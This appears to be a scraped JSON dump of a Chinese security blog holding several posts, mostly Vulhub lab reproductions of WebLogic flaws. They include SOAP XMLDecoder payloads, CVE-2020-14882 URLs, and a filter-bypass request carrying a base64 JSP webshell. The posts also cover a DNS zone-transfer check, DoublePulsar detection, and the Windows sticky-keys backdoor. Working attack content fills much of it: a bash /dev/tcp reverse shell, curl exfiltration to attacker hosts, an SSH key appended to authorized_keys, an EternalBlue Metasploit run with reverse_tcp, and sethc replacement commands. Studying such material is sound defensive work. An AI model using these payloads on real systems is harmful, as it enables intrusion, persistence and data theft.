但是在Vulhub的环境用不了，因为其Linux反弹shell的Exp用的Python，但目标环境没，这里改成用bash反弹shell即可： 12345678# self.cmd_payload = (# \"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.\"# \"SOCK_STREAM);s.connect((\\\"&#123;lhost&#125;\\\",&#123;lport&#125;));os.dup2(s.fileno(),0); os.dup2(\"# \"s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"]);'\"# ).format(lhost=self.lhost, lport=self.lport)self.cmd_payload = ( \"bash -i &gt;&amp; /dev/tcp/&#123;lhost&#125;/&#123;lport&#125; 0&gt;&amp;1\" ).format(lhost=self.lhost, lport=self.lport) 还有个点就是换成/bin/bash而非/bin/sh，改了之后就可以OK了： 写WebShell写入WebShell的Exp报文，看报文内容即可，换了java.io.PrintWriter类进行操作，其中WebShell文件时写入到了servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp中，其通过http://ip:7001/bea_wls_internal/test.jsp访问得到： 123456789101112131415161718&lt;soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"&gt; &lt;soapenv:Header&gt; &lt;work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"&gt; &lt;java&gt;&lt;java version=\"1.4.0\" class=\"java.beans.XMLDecoder\"&gt; &lt;object class=\"java.io.PrintWriter\"&gt; &lt;string&gt;servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp&lt;/string&gt; &lt;void method=\"println\"&gt;&lt;string&gt; &lt;![CDATA[&lt;% out.print(\"test\"); %&gt; ]]&gt; &lt;/string&gt; &lt;/void&gt; &lt;void method=\"close\"/&gt; &lt;/object&gt;&lt;/java&gt;&lt;/java&gt; &lt;/work:WorkContext&gt; &lt;/soapenv:Header&gt; &lt;soapenv:Body/&gt;&lt;/soapenv:Envelope&gt; 期间可以通过HTTP OOB来外带看看是否创建成功（服务端使用nc -lvnp 6666监听即可）： 123456789101112131415161718192021&lt;soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"&gt; &lt;soapenv:Header&gt;&lt;work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"&gt;&lt;java version=\"1.4.0\" class=\"java.beans.XMLDecoder\"&gt;&lt;void class=\"java.lang.ProcessBuilder\"&gt;&lt;array class=\"java.lang.String\" length=\"3\"&gt;&lt;void index=\"0\"&gt;&lt;string&gt;/bin/bash&lt;/string&gt;&lt;/void&gt;&lt;void index=\"1\"&gt;&lt;string&gt;-c&lt;/string&gt;&lt;/void&gt;&lt;void index=\"2\"&gt;&lt;string&gt;curl http://x.x.x.x:6666/x -d \"x=`ls servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war`\"&lt;/string&gt;&lt;/void&gt;&lt;/array&gt;&lt;void method=\"start\"/&gt;&lt;/void&gt;&lt;/java&gt;&lt;/work:WorkContext&gt;&lt;/soapenv:Header&gt;&lt;soapenv:Body/&gt;&lt;/soapenv:Envelope&gt; 最后访问即可/bea_wls_internal/test.jsp： 写SSH Key修改前面HTTP OOB外带查询当前用户的名称： 123456789101112131415161718192021&lt;soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"&gt; &lt;soapenv:Header&gt;&lt;work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"&gt;&lt;java version=\"1.4.0\" class=\"java.beans.XMLDecoder\"&gt;&lt;void class=\"java.lang.ProcessBuilder\"&gt;&lt;array class=\"java.lang.String\" length=\"3\"&gt;&lt;void index=\"0\"&gt;&lt;string&gt;/bin/bash&lt;/string&gt;&lt;/void&gt;&lt;void index=\"1\"&gt;&lt;string&gt;-c&lt;/string&gt;&lt;/void&gt;&lt;void index=\"2\"&gt;&lt;string&gt;curl http://x.x.x.x:6666/x -d \"x=`whoami`\"&lt;/string&gt;&lt;/void&gt;&lt;/array&gt;&lt;void method=\"start\"/&gt;&lt;/void&gt;&lt;/java&gt;&lt;/work:WorkContext&gt;&lt;/soapenv:Header&gt;&lt;soapenv:Body/&gt;&lt;/soapenv:Envelope&gt; 然后探测是否存在.ssh目录和authorized_keys文件： 1x=`ls -l /home/xxx/.ssh` 如果不存在则需要先创建，之后进行写SSH Key，使用追加的方式，不覆盖： 1&lt;string&gt;echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCgsrQRaSsoX1tEv0+xqWFaWrFt5RA+ZnaevW9Fh2y8RACQ1h++EpFyD0HqsQD5Gfz6bEzis9KbZaytyketcPOe7XB2Qd0r+kSPu7k1iycTj0A59/mbMwDH42WJd27aeTmyJCAyQl8E6zIVaTZw137I4jVcyOruSFHxjeOvH5gaut2s6AZyCxJx5DpVHt6Sbj2FHPVDtOZ/Dxv1cyhCaybBfX0U88T8xrIwX5KIMmd2cj2lJsVHXxHk255lBgGL1n1oWXgllOIDfg3HJFxzualjf+NzKmhg8B+4GSfGSY8KEK/pCeiaDIYcB2tVk3sUDUw5gEUEpGJWxQlAGClEQ29DvBjRT/6hESz4nYUKlOI4CfdCwlX6NDM8JHttZqdORrzXoOMeu1Nc4IBO4jNMfzBHecbWkPb+W2kyouwfe2yAToA10G6IdllUq9HzTlcqLe+XW11i8P0FVvbv7GKeEfnFxd/NY51H7E15P7O65DIxvjBQeKlnMOLTOy2+xPfIIRs=\" &gt;&gt; /home/xxx/.ssh/authorized_keys&lt;/string&gt; 查看是否成功： 1x=`cat /home/xxx/.ssh/authorized_keys` 写入成功后就能直接SSH登录了： 漏洞分析参考： https://paper.seebug.org/487/ https://bl4ck.in/vulnerability/analysis/2017/12/22/WebLogic-WLS-WebServices%E7%BB%84%E4%BB%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html 待分析… 防御方法 升级WebLogic版本； 删除WLS-WebServices组件；","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"},{"name":"WebLogic","slug":"WebLogic","permalink":"https://www.mi1k7ea.com/tags/WebLogic/"}]},{"title":"浅析WebLogic T3反序列化漏洞（CVE-2018-2628）","date":"2021-04-05T10:32:07.000Z","path":"2021/04/05/浅析WebLogic-T3反序列化漏洞（CVE-2018-2628）/","text":"0x00 前言简单学习WebLogic T3反序列化漏洞（CVE-2018-2628）。 0x01 WebLogic T3反序列化漏洞（CVE-2018-2628）这是xxlegend大佬挖的一个漏洞。 环境搭建用的Vulhub：https://vulhub.org/#/environments/weblogic/CVE-2018-2628/ 影响版本Oracle WebLogic Server 10.3.6.0, 12.1.3.0, 12.2.1.2 and 12.2.1.3。 漏洞原理简单地说，就是WebLogic开启了T3协议服务，攻击者可以通过T3协议来进行RMI反序列化漏洞的攻击利用从而RCE。 使用Nmap脚本探测T3服务Nmap的weblogic-t3-info脚本可以探测WebLogic的T3服务是否开启： 1nmap -n -v -p7001,7002 172.19.0.1 --script=weblogic-t3-info 这里探测目标环境7001端口是开启了T3服务的： 这里返回目标WebLogic的具体版本号为10.3.6.0以及开启了T3服务等信息，是存在T3反序列化漏洞的，接着进行漏洞复现。 漏洞复现先在攻击者服务器通过ysoserial来启动一个JRMP服务端，这里使用CommonsCollections1这条Gadget进行反序列化利用，其中通过DNSLog外带验证： 1java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 6666 CommonsCollections1 \"ping t3.f1gexy.dnslog.cn\" 然后，使用这个exploit脚本向目标WebLogic服务器发送报文： 1python exploit.py [victim ip] [victim port] [path to ysoserial] [JRMPListener ip] [JRMPListener port] [JRMPClient] 其中，[victim ip]和[victim port]是目标weblogic的IP和端口，[path to ysoserial]是本地ysoserial的路径，[JRMPListener ip]和[JRMPListener port]第一步中启动JRMP Server的IP地址和端口。[JRMPClient]是执行JRMPClient的类，可选的值是JRMPClient或JRMPClient2。 最后，看到DNSLog记录： 漏洞分析参考：https://mp.weixin.qq.com/s/nYY4zg2m2xsqT0GXa9pMGA 待分析… 防御方法 升级WebLogic版本； 关闭T3服务，或控制T3服务的访问权限；","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"},{"name":"WebLogic","slug":"WebLogic","permalink":"https://www.mi1k7ea.com/tags/WebLogic/"}]},{"title":"浅析WebLogic未授权RCE（CVE-2020-14882/CVE-2020-14883）","date":"2021-04-05T09:03:08.000Z","path":"2021/04/05/浅析WebLogic未授权RCE（CVE-2020-14882-CVE-2020-14883）/","text":"0x00 前言简单学习WebLogic未授权RCE（CVE-2020-14882/CVE-2020-14883）漏洞。 0x01 WebLogic未授权RCE环境搭建用的Vulhub：https://vulhub.org/#/environments/weblogic/CVE-2020-14882/ 影响版本Oracle WebLogic Server 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0 and 14.1.1.0.0。 漏洞原理 CVE-2020-14883：允许未授权的用户通过目录穿越结合双重URL编码的方式来绕过管理控制台的权限验证访问后台。 CVE-2020-14882：允许后台任意用户通过HTTP协议执行任意命令。 漏洞复现主要是以下两个CVE的组合利用，显示未授权访问后台，然后通过后台可以执行命令的接口实现RCE。 CVE-2020-14883正常情况下，没有登录WebLogic的话访问console后台就会直接302跳转到/console/login/LoginForm.jsp登录界面。 但是，通过目录穿越结合双重URL编码就能绕过认证实现未授权访问console后台： 这里未授权访问的payload为： 1http://ip:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel= CVE-2020-14882前面的CVE虽然可以访问后台，但是是低权限用户、无法安装应用，因此这里可以通过访问如下URL触发命令执行，这里用DNSLog实现外带验证： 1http://ip:7001/console/console.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(&quot;java.lang.Runtime.getRuntime().exec(&apos;curl%20http://weblogic.rlk5z3.dnslog.cn&apos;);&quot;) 看到本次利用的恶意类为com.tangosol.coherence.mvel2.sh.ShellSession。 组合利用将前面两个CVE组合起来利用就能实现未授权RCE的效果： 1http://ip:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(&quot;java.lang.Runtime.getRuntime().exec(&apos;curl%20http://weblogic.2qokvr.dnslog.cn&apos;);&quot;) 绕xx姿势123456789101112POST /biz/%2e./console/css/%25%32e%25%32e%25%32fconsole.portal HTTP/1.1Host: a.comConnection: closeUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36Content-Type: application/x-www-form-urlencodedCookie: BIGipServerSOL3_Docker_ZB=!ZhZtHJOmr5bPDjl6JVsajan6U8tjmcsXu/RgQvH6FyBrNzbalB857UZ0cOVZRMDvApu0sGpXvBnISqc=; TS01a69607=011223a830f54e1940dbb38950c7e6a279c477815452ea36745aed14040c887138bcb023eb2c41d4ba3cd0ba478b0228afcb3ead628ca92eac2dea5d867b15ba9443d0d8de;Content-Length: 2044X-Forwarded-For: 223.104.96.232Client_IP_ADDR: 223.104.96.232_nfpb=true&amp;_pageLabel=EJBTestHomePage&amp;handle=com.tangosol.coherence.mvel.sh.ShellSession(%25%327Runtim%25%365.g%25%365tRuntim%25%365().%25%365x%25%365c(n%25%365w String[]&#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;find $DOMAIN_HOME -typ%25%365 d -nam%25%365 b%25%365a_wls_int%25%365rnal|whil%25%365 r%25%365ad f;do find $f -typ%25%365 f -nam%25%365 ind%25%365x.html;don%25%365|whil%25%365 r%25%365ad ff;do %25%365cho -n PCVAIHBhZ2UgY29udGVudFR5cGU9InRl%25%365HQvaHRtbDsgY2hhcnNldD1VVEYtOCIgJT4KPCVAIHBhZ2UgaW1wb3J0PSJqYXZhLmlvLioiICU%25%32BCgo8JQpTdHJpbmcgY21kID0gcmVxdWVzdC5nZXRQYXJhbWV0ZXIoImNtZCIpOwpTdHJpbmcgb3V0cHV0ID0gIiI7CmlmIChjbWQgIT1udWxsICYmIGNtZCAhPSAiIikKICAgIHsKICAgICAgICBTdHJpbmdbXSBjb21tYW5kID0gU3lzdGVtLmdldFByb3BlcnR5KCJvcy5uYW1lIikudG9Mb3dlckNhc2UoKS5pbmRl%25%365E9mKCJ3aW5kb3dzIik%25%32BLTEgPyBuZXcgU3RyaW5nW10g%25%365yJjbWQuZXhlIiwgIi9jIiwgY21kfSA6IG5ldyBTdHJpbmdbXSB7Ii9iaW4vc2giLCAiLWMiLCBjbWR9OwoKICAgICAgICBTdHJpbmcgcyA9IG51bGw7CiAgICAgICAgdHJ5CiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFByb2Nlc3MgcCA9IFJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMoY29tbWFuZCk7CiAgICAgICAgICAgICAgICBCdWZmZXJlZFJlYWRlciBzSSA9IG5ldyBCdWZmZXJlZFJlYWRlcihuZXcgSW5wdXRTdHJlYW1SZWFkZXIocC5nZXRJbnB1dFN0cmVhbSgpKSk7CiAgICAgICAgICAgICAgICB3aGlsZSAoKHMgPSBzSS5yZWFkTGluZSgpKSAhPSBudWxsKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgb3V0cHV0ICs9IHMgKyJcclxuIjsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBCdWZmZXJlZFJlYWRlciBzSTEgPSBuZXcgQnVmZmVyZWRSZWFkZXIobmV3IElucHV0U3RyZWFtUmVhZGVyKHAuZ2V0RXJyb3JTdHJlYW0oKSkpOwogICAgICAgICAgICAgICAgd2hpbGUgKChzID0gc0kxLnJlYWRMaW5lKCkpICE9IG51bGwpCiAgICAgICAgICAgICAgICAgICAg%25%365wogICAgICAgICAgICAgICAgICAgICAgICBvdXRwdXQgKz0gcyArIlxyXG4iOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIGNhdGNoIChJT0V4Y2VwdGlvbiBlKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBlLnByaW50U3RhY2tUcmFjZSgpOwogICAgICAgICAgICB9CgogICAgfQogICAgZWxzZSBvdXRwdXQ9ImNtZCBzaGVsbCI7CiU%25%32BCjxwcmU%25%32BIDxjb2RlPjwlPW91dHB1dCU%25%32BIDwvY29kZT48L3ByZT4=|bas%25%36564 -d &gt;$(dirnam%25%365 $ff)/.xzs%25%365c.jsp;don%25%365&quot;&#125;);%25%327) 通杀的恶意类由前面知道，利用进行命令执行的恶意类是com.tangosol.coherence.mvel2.sh.ShellSession，其只能在Weblogic 12.2.1以上版本才能利用，这是因为10.3.6版本中并不存在该恶意类。 那就换个CVE-2019-2725中提到的更为通用的恶意类com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext，其对所有版本的WebLogic均有效。 FileSystemXmlApplicationContext类原理：该类会远程加载目标服务器上的XML文件并进行解析，其中可以指定解析的Bean为ProcessBuilder类及其start()函数、构造函数参数为恶意命令，进而实现RCE。 首先，需要将恶意XML文件放置在攻击者服务器上，前提是WebLogic服务器能访问得到： 1234567891011121314&lt;?xml version=\"1.0\" encoding=\"UTF-8\" ?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\"&gt; &lt;bean id=\"pb\" class=\"java.lang.ProcessBuilder\" init-method=\"start\"&gt; &lt;constructor-arg&gt; &lt;list&gt; &lt;value&gt;bash&lt;/value&gt; &lt;value&gt;-c&lt;/value&gt; &lt;value&gt;&lt;![CDATA[curl http://weblogic.pqczq8.dnslog.cn]]&gt;&lt;/value&gt; &lt;/list&gt; &lt;/constructor-arg&gt; &lt;/bean&gt;&lt;/beans&gt; 接着，同前面的方法，让WebLogic服务器去加载该恶意XML文件： 1http://ip:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(&quot;http://attacker.com/rce.xml&quot;) 漏洞分析待分析… 工具参考：https://github.com/GGyao/CVE-2020-14882_ALL 防御方法升级WebLogic版本。","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"},{"name":"WebLogic","slug":"WebLogic","permalink":"https://www.mi1k7ea.com/tags/WebLogic/"}]},{"title":"浅析DNS域传送漏洞","date":"2021-04-03T14:15:23.000Z","path":"2021/04/03/浅析DNS域传送漏洞/","text":"0x00 前言环境参考：https://vulhub.org/#/environments/dns/dns-zone-transfer/ 0x01 DNS域传送漏洞DNS域传送DNS主备服务器会通过DNS域传送来进行数据库的同步。域传送是指后备服务器从主服务器复制数据，并用得到的数据更新自身数据库。 DNS域传送漏洞DNS协议支持使用axfr类型的记录进行区域传送，用来解决主从同步的问题。如果管理员在配置DNS服务器的时候没有限制允许获取记录的来源，将会导致DNS域传送漏洞，也就是说，攻击者可以利用这个漏洞来获取该DNS中记录的敏感信息。 检测方法通过dig检测在Linux下，可以使用dig命令来发送DNS请求。 发送axfr类型的DNS请求，注意要查询的域名前面无需带子域名如www： 1dig @目标DNS服务器ip axfr 查询的域名 其中@指定DNS服务器；axfr（Authoritative Transfer的缩写）是q-type类型的一种、指请求传送某个区域的全部记录。 发送一个axfr请求来欺骗DNS服务器，如果该DNS服务器上存在该漏洞，就会返回所有的解析记录值。 看下Vulhub的环境吧。 运行了漏洞靶机后，docker容器的53端口和宿主机是绑定的，也就是说这个存在域传送漏洞的DNS服务器写宿主机的IP即可。 正常来说，dig解析vulhub.org域名结果如下，其中指定8.8.8.8的DNS服务器是不存在域传送漏洞的： 然后，指定为存在域传送漏洞的DNS服务器进行再次查询，看到是完全返回该漏洞DNS服务器中保存的目标域的所有敏感信息，包括所有子域、A记录、CNAME等等： 通过nslookup检测在Windows下的nslookup命令可以先指定目标DNS服务器地址、再使用ls命令来检测是否存在DNS域传送漏洞。 123D:\\&gt;nslookup&gt;server 目标DNS服务器地址&gt;ls 目标域名 如果不存在DNS域传送漏洞则输出如下： 在Linux中可以进行如下操作来检测。 默认查询域名的子域名信息，返回未授权的回应： 如果指定了存在DNS域传送漏洞的DNS服务器，再次查询目标域名的子域名信息时就会直接返回回来： 通过Nmap检测使用DNS域传送脚本检测： 1nmap -script dns-zone-transfer -script-args dns-zone-transfer.domain=xxx.yyy.com -p 53 -Pn dns.xxx.yyy.com 通过dnsrecon检测1dnsrecon -d example.com 通过dnsenum检测dnsenum默认包含自动检测域传送漏洞： 1dnsenum example.com","tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://www.mi1k7ea.com/tags/渗透测试/"}]},{"title":"WebLogic弱口令getshell","date":"2021-04-01T13:54:18.000Z","path":"2021/04/01/WebLogic弱口令getshell/","text":"0x00 前言总结在WebLogic弱口令登录console的场景下的getshell方式。 0x01 WebLogic常见弱口令 账户 密码 system password weblogic weblogic guest guest portaladmin portaladmin admin security joe password mary password system security wlcsystem wlcsystem wlcsystem sipisystem 更多的一些常见弱密码： 1234567weblogic1weblogic12weblogic123weblogic@123webl0gicweblogic#weblogic@ 0x02 WebLogic控制台getshell部署WAR包getshell弱口令登录WebLogic控制台，点击”锁定并编辑”： 点击部署，然后安装： 点击上载文件： 在部署档案中上传恶意WAR包文件后，点击位于上方的下一步： 继续默认点击位于上方的下一步，直至遇到并点击完成： 接着激活更改： 启动我们部署的WAR包程序： 正常启动之后，如下： 连上： 恶意WAR包制作： 先编写一个恶意的jsp文件或者使用哥斯拉等工具直接生成，如test.jsp； 将test.jsp压缩成zip格式的压缩文件，如test.zip； 直接修改zip压缩文件的后缀名为war即可，如test.war；","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"},{"name":"WebLogic","slug":"WebLogic","permalink":"https://www.mi1k7ea.com/tags/WebLogic/"}]},{"title":"浅析WebLogic任意文件上传（CVE-2018-2894）","date":"2021-04-01T01:49:22.000Z","path":"2021/04/01/浅析Weblogic任意文件上传（CVE-2018-2894）/","text":"0x00 前言简单学习WebLogic任意文件上传（CVE-2018-2894）漏洞。 0x01 CVE-2018-2894环境搭建用的Vulhub：https://vulhub.org/#/environments/weblogic/CVE-2018-2894/ 前提条件 开启了Weblogic Web Service Test Page，此配置项默认是关闭的； 知道Web目录路径； 影响版本Oracle WebLogic Server 10.3.6.0, 12.1.3.0, 12.2.1.2, 12.2.1.3。 漏洞原理Weblogic Web Service Test Page中存在任意文件上传漏洞，攻击者可上传任意jsp文件来getshell。 漏洞复现访问http://ip:7001/console进入到登录界面。 使用如下命令来查找WebLogic的密码： 1234root@DGSec:~/vulhub/weblogic/CVE-2018-2894# docker-compose logs | grep passwordweblogic_1 | ----&gt; 'weblogic' admin password: cqy9mA2mweblogic_1 | admin password : [cqy9mA2m]weblogic_1 | * password assigned to an admin-level user. For * 登录上去之后，点击base_domain，在”配置”-&gt;”一般信息”-&gt;”高级”中开启”启用 Web 服务测试页”选项： 接着访问http://ip:7001/ws_utc/config.do页面，即Web服务测试页，设置Work Home Dir即当前的工作目录为/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css，即将目录设置为ws-utc应用的静态css文件目录，因为该目录是无需权限的： 接着，点击左侧的安全栏目来添加JSP WebShell，这里WebShell用的哥斯拉生成的： 抓包记下响应报文的时间戳： 访问路径，是存在的：http://ip:7001/ws_utc/css/config/keystore/1617251643547_shell.jsp 连上： 最后，个人测试以下几个静态目录都是可行的： 123/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/js/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/images 漏洞分析待分析… 防御方法升级WebLogic版本。","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"},{"name":"WebLogic","slug":"WebLogic","permalink":"https://www.mi1k7ea.com/tags/WebLogic/"}]},{"title":"自建DNSLog平台","date":"2021-03-29T13:13:05.000Z","path":"2021/03/29/自建DNSLog平台/","text":"0x00 前言有时候网上一些常用的DNSLog平台可能会被目标站点黑名单过滤掉，此时就可以自建DNSLog平台来应对这种情况了。 0x01 自建DNSLog平台本次使用一个域名的方式来搭建，而非网上大多数采用两个域名的方式搭建。 先准备一个域名和一台vps，这里均用的阿里云。 接着，到云解析DNS中，进行相应的配置： 其中红框为vps的IP地址，蓝框为域名的ns1和ns2子域。 然后，在云服务器ECS安全组规则里添加对外开发53端口的规则，协议是UDP。 接着搭建DNSLog服务端，这里使用的DNSlog-GO，项目地址：https://github.com/lanyi1998/DNSlog-GO 下载到vps上之后，需要先安装GO环境，参考：https://blog.csdn.net/u014454538/article/details/88649963 GO环境安装完成之后，直接运行main即可： 此时Web界面就可以访问了，试下ping效果： 没问题了，但是最后有个疑问，就是ping得出的IP是127.0.0.1？有点意思哈哈","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"DNSLog","slug":"DNSLog","permalink":"https://www.mi1k7ea.com/tags/DNSLog/"}]},{"title":"DoublePulsar后门检测","date":"2021-03-27T08:00:32.000Z","path":"2021/03/27/DoublePulsar后门检测/","text":"0x00 前言一般的，DoublePulsar后门会和Wannacry一块出没。而这就需要在做应急响应或者内网主机安全排查的时候来进行检测。 0x01 DoublePulsar后门检测DoublePulsar简介DoublePulsar是由美国国家安全局（NSA）方程式组开发的后门植入工具，于2017年初由影子经纪人（The Shadow Brokers）泄露。该工具仅在几周内感染了超过200,000台Microsoft Windows计算机，并在2017年5月的WannaCry勒索软件攻击中与EternalBlue一起使用。 DoublePulsar以内核模式运行， 属于Rootkit，这使网络犯罪分子能够对计算机系统进行高级别的控制。安装后，它使用三个命令：ping、kill和 exec、exec可用于将恶意软件加载到系统上。 具体漏洞分析参考：https://www.freebuf.com/news/138725.html DoublePulsar后门检测方法GitHub检测脚本项目地址：https://github.com/countercept/doublepulsar-detection-script 以Python2运行，分为SMB和RDP两个脚本。 12345678910111213141516171819202122232425root@kali:~# python detect_doublepulsar_smb.py --ip 192.168.175.128[-] [192.168.175.128] No presence of DOUBLEPULSAR SMB implantroot@kali:~# python detect_doublepulsar_smb.py --ip 192.168.175.128[+] [192.168.175.128] DOUBLEPULSAR SMB IMPLANT DETECTED!!!root@kali:~# python detect_doublepulsar_rdp.py --file ips.list --verbose --threads 1[*] [192.168.175.141] Sending negotiation request[*] [192.168.175.141] Server explicitly refused SSL, reconnecting[*] [192.168.175.141] Sending non-ssl negotiation request[*] [192.168.175.141] Sending ping packet[-] [192.168.175.141] No presence of DOUBLEPULSAR RDP implant[*] [192.168.175.143] Sending negotiation request[*] [192.168.175.143] Server chose to use SSL - negotiating SSL connection[*] [192.168.175.143] Sending SSL client data[*] [192.168.175.143] Sending ping packet[-] [192.168.175.143] No presence of DOUBLEPULSAR RDP implant[*] [192.168.175.142] Sending negotiation request[*] [192.168.175.142] Sending client data[*] [192.168.175.142] Sending ping packet[+] [192.168.175.142] DOUBLEPULSAR RDP IMPLANT DETECTED!!!root@kali:~# python2 detect_doublepulsar_smb.py --ip 192.168.175.136 --uninstall[+] [192.168.175.136] DOUBLEPULSAR SMB IMPLANT DETECTED!!! XOR Key: 0x7c3bf3c1[+] [192.168.175.136] DOUBLEPULSAR uninstall successful Nmap参考：https://nmap.org/nsedoc/scripts/smb-double-pulsar-backdoor.html 1nmap -p 445 &lt;target&gt; --script=smb-double-pulsar-backdoor 扫描输出： 123456789101112| smb-double-pulsar-backdoor:| VULNERABLE:| Double Pulsar SMB Backdoor| State: VULNERABLE| Risk factor: HIGH CVSSv2: 10.0 (HIGH) (AV:N/AC:L/Au:N/C:C/I:C/A:C)| The Double Pulsar SMB backdoor was detected running on the remote machine.|| Disclosure date: 2017-04-14| References:| https://isc.sans.edu/forums/diary/Detecting+SMB+Covert+Channel+Double+Pulsar/22312/| https://github.com/countercept/doublepulsar-detection-script|_ https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation MSF如下： 12345678910111213141516171819202122# 下载对应的MSF插件并复制到目标目录中git clone https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit.gitcd Eternalblue-Doublepulsar-Metasploit/cp eternalblue_doublepulsar.rb /usr/share/metasploit-framework/modules/exploits/windows/smb/# 安装依赖dpkg --add-architecture i386 &amp;&amp; apt-get update &amp;&amp; apt-get install wine32 --fix-missing# 创建.wine/drive_c目录，否则后续利用漏洞时会出现目录不存在错误mkdir -p /root/.wine/drive_c# 开启MSF并重新加载插件msfconsolereload_all# 漏洞利用use exploit/windows/smb/eternalblue_doublepulsarset rhost 192.168.200.142set payload windows/x64/meterpreter/reverse_tcpset lhost 192.168.200.130set PROCESSINJECT explorer.exe # 注意，需要设置PROCESSINJECT，使用默认值并没成功，改PROCESSINJECT为explorer.exe成功run 防御方法如果扫描出来，可以应用前面的检测脚本清理掉： 1python2 detect_doublepulsar_smb.py --ip 192.168.175.136 --uninstall 然后，安装补丁。","tags":[{"name":"Windows","slug":"Windows","permalink":"https://www.mi1k7ea.com/tags/Windows/"},{"name":"DoublePulsar","slug":"DoublePulsar","permalink":"https://www.mi1k7ea.com/tags/DoublePulsar/"}]},{"title":"Windows Shift后门利用","date":"2021-03-26T15:55:01.000Z","path":"2021/03/26/Windows-Shift后门利用/","text":"0x00 前言通常，在内网渗透打下一台机子之后，可以给这台机子留个Shift后门。 0x01 Shift后门利用简介粘滞键漏洞，在Windows系统下连续按5下SHIFT键，可以启动系统的粘滞键功能，其进程名为Sethc.exe，应用程序在Windows\\system32下。 黑客用其它应用程序（如：cmd.exe、explorer.exe 或木马、病毒）将Sethc.exe替换。当再次连续按5次SHIFT键，就会启动黑客替换的应用程序，如此便留下了5下SHIFT后门，黑客3389登录远程计算机时，在用户登录界面，连续按5下SHIFT就可以启动该漏洞，进而控制远程计算机。 漏洞原理在Windows系统登录界面状态下，粘滞键仍可以以连续按5下SHIFT键运行，并且此时应用程序会以WINDOWS的最高权限－SYSTEM权限运行，所以计算机一旦被安装该后门，入侵者便可悄无声息地远程操纵计算机。 漏洞利用大致思路如下： 拿到目标主机权限后，到Windows\\system32目录下，将sethc.exe替换成cmd.exe； 其中，命令行方式为： 1234copy c:\\windows\\system32\\cmd.exe c:\\windows\\system32\\sethc.execopy c:\\windows\\system32\\sethc.exe c:\\windows\\system32\\dllcache\\sethc.exeattrib c:\\windows\\system32\\sethc.exe +hattrib c:\\windows\\system32\\dllcache\\sethc.exe +h 注意：要将dllcache文件夹中的缓存删掉，否则会自动复原回去。 注册表方式为： 1REG ADD 